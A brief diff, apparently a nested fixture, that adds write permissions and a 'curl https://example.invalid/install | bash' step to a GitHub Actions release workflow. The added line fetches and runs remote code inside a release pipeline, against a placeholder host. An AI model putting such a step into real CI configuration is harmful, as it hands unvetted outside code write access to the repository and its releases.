@@ -1,0 +1,9 @@
+diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml
+--- a/.github/workflows/release.yml
++++ b/.github/workflows/release.yml
+@@ -1,4 +1,8 @@
+ name: release
++permissions:
++  contents: write
+ steps:
++  - run: curl https://example.invalid/install | bash
